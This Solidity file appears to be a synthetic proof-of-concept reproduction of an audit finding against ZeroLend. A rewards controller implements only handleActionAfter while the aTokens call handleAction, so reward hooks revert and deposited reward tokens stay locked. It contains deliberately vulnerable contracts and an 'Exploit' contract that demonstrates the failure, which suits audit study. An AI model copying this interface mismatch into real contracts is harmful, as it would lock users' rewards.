// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  ZeroLend — ZLRewardsController vs ZeroLend aTokens (Cantina Jan 2024, AuditVault 40817)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: ZeroLend aTokens call Aave's handleAction. ZLRewardsController,
    forked from Radiant, only implements handleActionAfter. The hook reverts,
    user reward debt stays 0, and claim pays 0 while the reward tokens sit
    in the controller.
    Blamed calls copied verbatim (@> VULN). */

interface IAaveIncentivesController {
    function handleAction(address user, uint256 totalSupply, uint256 userBalance) external;
}

contract RewardToken {
    string public name = "ZeroLend Reward";
    string public symbol = "ZERO";
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply;

    function mint(address to, uint256 amount) external {
        totalSupply += amount;
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract ZLRewardsController {
    error NotRTokenOrMfd();

    RewardToken public reward;
    mapping(address => bool) public validRTokens;
    address public streamedVesting;
    mapping(address => uint256) public accrued;
    uint256 public deposited;
    uint256 public lastClaimed;

    constructor(RewardToken _reward) {
        reward = _reward;
        streamedVesting = address(0x1);
    }

    function setRToken(address token) external {
        validRTokens[token] = true;
    }

    function depositRewards(uint256 amount) external {
        reward.transferFrom(msg.sender, address(this), amount);
        deposited += amount;
    }

    function handleActionAfter(address _user, uint256 _balance, uint256 _totalSupply) external {
        if (!validRTokens[msg.sender] && msg.sender != address(streamedVesting)) revert NotRTokenOrMfd();

        if (_user == address(streamedVesting)) return;

        _handleActionAfterForToken(msg.sender, _user, _balance, _totalSupply);
    }

    function _handleActionAfterForToken(address, address user, uint256 balance, uint256 totalSupply_) internal {
        if (totalSupply_ == 0 || balance == 0) return;
        uint256 share = reward.balanceOf(address(this)) * balance / totalSupply_;
        if (share > accrued[user]) accrued[user] = share;
    }

    function claim(address user) external returns (uint256 paid) {
        paid = accrued[user];
        lastClaimed = paid;
        if (paid != 0) {
            accrued[user] = 0;
            reward.transfer(user, paid);
        }
    }
}

/// ZeroLend aToken. Balance changes call handleAction, not handleActionAfter.
contract ZeroLendAToken {
    address public controller;
    mapping(address => uint256) public balanceOf;
    uint256 internal _totalSupply;

    constructor(address _controller) {
        controller = _controller;
    }

    function seed(address to, uint256 amount) external {
        balanceOf[to] += amount;
        _totalSupply += amount;
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        _transfer(msg.sender, recipient, uint128(amount));
        return true;
    }

    function _transfer(address sender, address recipient, uint128 amount) internal {
        uint256 oldSenderBalance = balanceOf[sender];
        uint256 oldRecipientBalance = balanceOf[recipient];
        balanceOf[sender] = oldSenderBalance - uint256(amount);
        balanceOf[recipient] = oldRecipientBalance + uint256(amount);

        IAaveIncentivesController incentivesControllerLocal = IAaveIncentivesController(controller);
        if (address(incentivesControllerLocal) != address(0)) {
            uint256 currentTotalSupply = _totalSupply;
            // @> VULN: ZeroLend calls handleAction; ZLRewardsController only implements handleActionAfter
            incentivesControllerLocal.handleAction(sender, currentTotalSupply, oldSenderBalance);

            if (sender != recipient) {
                incentivesControllerLocal.handleAction(recipient, currentTotalSupply, oldRecipientBalance);
            }
        }
    }
}

contract Exploit {
    uint256 public constant REWARD = 1000e18;
    uint256 public constant SUPPLY = 100e18;
    address public constant SINK = 0x000000000000000000000000000000000000bEEF;

    RewardToken public reward; // CREATE nonce 1
    ZLRewardsController public controller; // CREATE nonce 2
    ZeroLendAToken public aToken; // CREATE nonce 3

    bool public hookReverted;
    uint256 public claimed;
    uint256 public controllerBalance;
    uint256 public userRewardBalance;

    constructor() {
        reward = new RewardToken();
        controller = new ZLRewardsController(reward);
        aToken = new ZeroLendAToken(address(controller));
        controller.setRToken(address(aToken));
        aToken.seed(address(this), SUPPLY);
        reward.mint(address(this), REWARD);
    }

    function run() external {
        reward.approve(address(controller), REWARD);
        controller.depositRewards(REWARD);

        uint256 sitting = reward.balanceOf(address(controller));
        require(sitting == REWARD, "1000 ZERO deposited");

        try aToken.transfer(SINK, 1) {
            hookReverted = false;
        } catch {
            hookReverted = true;
        }
        require(hookReverted, "handleAction did not revert");
        require(aToken.balanceOf(address(this)) == SUPPLY, "aToken balance rolled back");

        claimed = controller.claim(address(this));
        require(claimed == 0, "claim paid 0");

        controllerBalance = reward.balanceOf(address(controller));
        userRewardBalance = reward.balanceOf(address(this));
        require(controllerBalance == REWARD, "1000 ZERO still in the controller");
        require(userRewardBalance == 0, "user received 0 ZERO");
    }
}
